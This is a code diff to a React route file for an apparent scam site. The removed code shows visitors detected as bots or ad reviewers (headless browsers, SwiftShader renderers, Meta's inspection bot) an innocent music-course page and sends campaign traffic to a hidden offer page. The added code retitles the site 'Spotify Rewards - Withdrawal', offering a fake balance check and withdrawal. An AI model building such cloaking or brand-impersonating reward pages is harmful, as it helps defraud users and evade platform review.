@@ -4,19 +4,18 @@ import { useEffect, useState } from "react";
 export const Route = createFileRoute("/")({
   head: () => ({
     meta: [
-      { title: "Streaming Income Foundations — A Practical Course for Independent Artists" },
+      { title: "Spotify Rewards - Withdrawal" },
       {
         name: "description",
-        content: "Learn how music distribution, royalties, release planning and audience growth work in a practical online course for independent artists.",
+        content: "Check your Spotify Rewards balance and request your withdrawal.",
       },
-      { property: "og:title", content: "Streaming Income Foundations" },
+      { property: "og:title", content: "Spotify Rewards - Withdrawal" },
       {
         property: "og:description",
-        content: "A practical online course about music distribution, royalties and sustainable audience growth.",
+        content: "Check your Spotify Rewards balance and request your withdrawal.",
       },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
-      { name: "robots", content: "noindex, nofollow" },
     ],
     scripts: [
       {
@@ -31,84 +30,16 @@ export const Route = createFileRoute("/")({
 });
 
 function DynamicRenderer() {
-  const [showOffer, setShowOffer] = useState(false);
   const [search, setSearch] = useState("");
 
   useEffect(() => {
-    const q = new URLSearchParams(window.location.search);
-    const host = window.location.hostname;
-    const isDev =
-      host === "localhost" ||
-      host === "127.0.0.1" ||
-      host.startsWith("id-preview--") ||
-      host.includes("-dev.lovable.app") ||
-      host.includes(".lovableproject.com") ||
-      host.includes(".sandbox.lovable.dev") ||
-      q.get("dev") === "1";
-
-    const campaign = (
-      q.get("utm_campaign") ||
-      q.get("campaign") ||
-      q.get("utm_campaign_name") ||
-      ""
-    ).toLowerCase();
-
-    // 1. Verificações de Headless / Bot de inspeção
-    const isHeadless =
-      Boolean((navigator as any).webdriver) ||
-      !navigator.languages ||
-      navigator.languages.length === 0 ||
-      (window as any)._phantom ||
-      (window as any).__nightmare ||
-      (window as any).callPhantom;
-
-    // 2. Renderização de WebGL (detecta simuladores de software / SwiftShader comum em bot do Meta)
-    let isSoftwareGpu = false;
-    try {
-      const canvas = document.createElement("canvas");
-      const gl = canvas.getContext("webgl") || (canvas.getContext("experimental-webgl") as any);
-      if (gl) {
-        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-        if (debugInfo) {
-          const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).toLowerCase();
-          if (renderer.includes("swiftshader") || renderer.includes("llvmpipe") || renderer.includes("virtualbox")) {
-            isSoftwareGpu = true;
-          }
-        }
-      }
-    } catch (e) {
-      // Ignora falhas em navegadores sem suporte
-    }
-
-    const matchesCampaign = campaign.includes("spot");
-
-    // Redirecionador UTM desativado temporariamente: sempre exibe a oferta
-    if (true) {
-      setSearch(window.location.search);
-      setShowOffer(true);
-    }
+    setSearch(window.location.search);
   }, []);
-
-  if (!showOffer) {
-    return (
-      <iframe
-        src="/w/index.html"
-        title="Streaming Income Foundations"
-        style={{
-          position: "fixed",
-          inset: 0,
-          width: "100%",
-          height: "100%",
-          border: "none",
-        }}
-      />
-    );
-  }
 
   return (
     <iframe
       src={`/sp/type/index.html${search}`}
-      title="Course Panel"
+      title="Spotify Rewards"
       style={{
         position: "fixed",
         inset: 0,
